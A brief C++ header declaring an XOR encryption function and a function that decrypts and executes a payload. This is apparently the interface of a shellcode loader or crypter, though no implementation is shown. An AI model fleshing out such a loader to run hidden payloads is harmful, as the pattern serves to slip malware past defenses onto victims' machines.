#ifndef ADVANCEDENCRYPTION_H
#define ADVANCEDENCRYPTION_H

#include <string>
#include <vector>

// XOR encryption function
void XOREncrypt(unsigned char* data, unsigned long long dataLen, const unsigned char* key, unsigned long long keyLen);

// Function to load and execute the decrypted payload
void LoadAndExecutePayload(unsigned char* payload, size_t payload_len, const unsigned char* key, size_t key_len);

#endif // ADVANCEDENCRYPTION_H
